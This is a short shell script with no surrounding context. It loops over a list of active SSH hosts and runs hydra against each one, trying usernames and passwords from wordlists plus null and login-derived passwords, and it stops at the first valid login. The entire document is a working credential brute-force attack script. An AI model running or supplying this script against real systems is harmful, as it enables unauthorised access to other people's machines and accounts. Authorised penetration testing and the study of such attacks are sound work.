while read line; do
	hydra -L users.txt -P dic_passwd.txt -e nsr -f -t 4 -vV $line ssh 
done < ssh_active_host.txt
